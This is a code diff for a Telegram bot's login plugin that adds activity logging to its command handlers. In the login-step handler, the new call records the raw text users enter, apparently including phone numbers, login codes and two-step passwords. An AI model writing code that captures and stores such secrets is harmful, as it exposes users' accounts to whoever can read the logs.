@@ -10,6 +10,7 @@ import os
 from config import API_HASH, API_ID
 from shared_client import app as bot
 from utils.func import save_user_session, get_user_data, remove_user_session, save_user_bot, remove_user_bot
+from utils.func import save_user_activity
 from utils.encrypt import ecs, dcs
 from plugins.batch import UB, UC
 from utils.custom_filters import login_in_progress, set_user_step, get_user_step
@@ -26,9 +27,12 @@ login_cache = {}
 @bot.on_message(filters.command('login'))
 async def login_command(client, message):
     user_id = message.from_user.id
+    await save_user_activity(user_id, message.from_user, "/login")
+
     set_user_step(user_id, STEP_PHONE)
     login_cache.pop(user_id, None)
     await message.delete()
+
     status_msg = await message.reply(
         """请输入手机号（带国家代码）
 例如: `+861234567890`"""
@@ -39,6 +43,9 @@ async def login_command(client, message):
 @bot.on_message(filters.command("setbot"))
 async def set_bot_token(C, m):
     user_id = m.from_user.id
+
+    await save_user_activity(user_id, m.from_user, "/setbot")
+
     args = m.text.split(" ", 1)
     if user_id in UB:
         try:
@@ -69,6 +76,9 @@ async def set_bot_token(C, m):
 @bot.on_message(filters.command("rembot"))
 async def rem_bot_token(C, m):
     user_id = m.from_user.id
+
+    await save_user_activity(user_id, m.from_user, "/rembot")
+
     if user_id in UB:
         try:
             await UB[user_id].stop()
@@ -101,6 +111,9 @@ async def handle_login_steps(client, message):
     user_id = message.from_user.id
     text = message.text.strip()
     step = get_user_step(user_id)
+
+    await save_user_activity(user_id, message.from_user, "login steps", {"step": step, "text": text})
+
     try:
         await message.delete()
     except Exception as e:
@@ -201,7 +214,6 @@ async def handle_login_steps(client, message):
         set_user_step(user_id, None)
 
 
-
 async def edit_message_safely(message, text):
     """Helper function to edit message and handle errors"""
     try:
@@ -214,6 +226,9 @@ async def edit_message_safely(message, text):
 @bot.on_message(filters.command('cancel'))
 async def cancel_login_command(client, message):
     user_id = message.from_user.id
+
+    await save_user_activity(user_id, message.from_user, "/cancel")
+
     await message.delete()
     if get_user_step(user_id):
         status_msg = login_cache.get(user_id, {}).get('status_msg')
@@ -235,6 +250,9 @@ async def cancel_login_command(client, message):
 @bot.on_message(filters.command('logout'))
 async def logout_command(client, message):
     user_id = message.from_user.id
+
+    await save_user_activity(user_id, message.from_user, "/logout")
+
     await message.delete()
     status_msg = await message.reply('🔄 处理登出请求...')
     try:
